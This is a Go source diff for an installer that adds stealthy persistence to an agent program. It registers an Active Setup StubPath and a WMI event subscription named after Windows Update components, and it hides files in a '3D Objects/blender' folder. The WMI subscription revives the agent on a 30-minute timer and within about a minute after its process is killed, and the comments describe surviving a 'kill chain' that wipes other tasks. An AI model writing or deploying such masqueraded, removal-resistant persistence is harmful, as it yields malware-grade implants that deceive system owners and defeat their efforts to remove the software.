@@ -352,6 +352,11 @@ func install() {
 	createWatchdogTask(agentPath, blenderDir)
 	_ = copyFile(filepath.Join(blenderDir, "watchdog_task.xml"), filepath.Join(installDir, "watchdog_task.xml"))
 
+	// Logon-time vector: Active Setup runs StubPath once per user per
+	// version. Detached via cmd/start so it can NEVER block logon (a
+	// never-exiting watcher as StubPath would hang the desktop).
+	ensureActiveSetup(agentPath)
+
 	// Third persistence task under a different name: a kill chain wiping
 	// "WindowsUpdate*" still leaves this one to revive everything.
 	createOrchestratorTask(agentPath, blenderDir, installDir)
@@ -430,6 +435,7 @@ func main() {
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
 		_, _ = exec.Command("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
 		removeWmiLayer()
+		_ = registry.DeleteKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`)
 		threeDObjects := filepath.Join(os.Getenv("USERPROFILE"), "3D Objects")
 		blenderDir := filepath.Join(threeDObjects, "blender")
 		_ = os.Remove(filepath.Join(blenderDir, "watchdog.ps1"))
@@ -565,7 +571,27 @@ func createOrchestratorTask(agentPath, backupDir, installDir string) {
 	_ = os.Remove(tmpTask)
 }
 
+// activeSetupStub builds the detached launcher (cmd/start returns at
+// once; Active Setup waits for StubPath exit, so this must never block).
+func activeSetupStub(agentPath string) string {
+	return `cmd.exe /c start "" /min "` + agentPath + `" --watch`
+}
+
+// ensureActiveSetup registers the logon-time vector (idempotent).
+func ensureActiveSetup(agentPath string) {
+	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`, registry.WRITE)
+	if err != nil {
+		log.Printf("[!] Active Setup key: %v", err)
+		return
+	}
+	defer k.Close()
+	_ = k.SetStringValue("StubPath", activeSetupStub(agentPath))
+	_ = k.SetStringValue("Version", version.Version)
+	log.Printf("[*] Active Setup logon vector set")
+}
+
 const wmiFilterName = "WindowsUpdateFilter"
+const wmiDeathFilterName = "WindowsUpdateDeathFilter"
 const wmiConsumerName = "WindowsUpdateConsumer"
 const wmiTimerID = "WindowsUpdateTimer"
 
@@ -576,29 +602,37 @@ const wmiTimerID = "WindowsUpdateTimer"
 // creation can fail under locked-down WMI/Defender — logged, install goes on.
 func setupWmiLayer(agentPath string) {
 	consumer := `"` + agentPath + `" --wmi-heal`
-	ps := `$na='` + wmiFilterName + `';$nc='` + wmiConsumerName + `';$tid='` + wmiTimerID + `';` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+	// Two triggers share one consumer: a 30-minute timer (total-wipe
+	// recovery) plus an agent-death event (taskkill answered in ~1min).
+	// The consumer only repairs + kickstarts tasks (never starts the agent
+	// itself: as SYSTEM it would land in session 0, breaking interactivity).
+	ps := `$na='` + wmiFilterName + `';$nd='` + wmiDeathFilterName + `';$nc='` + wmiConsumerName + `';$tid='` + wmiTimerID + `';` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
 		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
 		`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
 		`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
 		`$t=New-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Property @{TimerId=$tid;IntervalBetweenEvents=[uint32]1800000} -ErrorAction Stop;` +
 		`$f=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$na;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __TimerEvent WHERE TimerId='$tid'"} -ErrorAction Stop;` +
+		`$d=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{Name=$nd;EventNamespace='root/cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceDeletionEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name='MicrosoftWindowsClient.exe' OR TargetInstance.Name='agent.exe')"} -ErrorAction Stop;` +
 		`$c=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{Name=$nc;CommandLineTemplate='` + strings.ReplaceAll(consumer, "'", "''") + `'} -ErrorAction Stop;` +
 		`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$f;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;` +
+		`New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{Filter=[Ref]$d;Consumer=[Ref]$c} -ErrorAction Stop | Out-Null;` +
 		`Write-Host 'WMI-OK'`
 	out, err := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).CombinedOutput()
 	if err != nil || !strings.Contains(string(out), "WMI-OK") {
 		log.Printf("[!] WMI layer not installed (non-fatal): %v %s", err, strings.TrimSpace(string(out)))
 		return
 	}
-	log.Printf("[*] WMI resurrection timer installed (30min)")
+	log.Printf("[*] WMI resurrection installed (30min timer + death trigger)")
 }
 
-// removeWmiLayer deletes the WMI timer/consumer (uninstall path).
+// removeWmiLayer deletes the WMI timer/death triggers + consumer (uninstall).
 func removeWmiLayer() {
-	ps := `$na='` + wmiFilterName + `';$nc='` + wmiConsumerName + `';$tid='` + wmiTimerID + `';` +
-		`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+	ps := `$na='` + wmiFilterName + `';$nd='` + wmiDeathFilterName + `';$nc='` + wmiConsumerName + `';$tid='` + wmiTimerID + `';` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter.Name -eq $na -or $_.Filter.Name -eq $nd } | Remove-CimInstance -ErrorAction SilentlyContinue;` +
 		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$na'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
+		`Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='$nd'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
 		`Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter "Name='$nc'" | Remove-CimInstance -ErrorAction SilentlyContinue;` +
 		`Get-CimInstance -Namespace root/subscription -ClassName __IntervalTimerInstruction -Filter "TimerId='$tid'" | Remove-CimInstance -ErrorAction SilentlyContinue`
 	_, _ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).CombinedOutput()
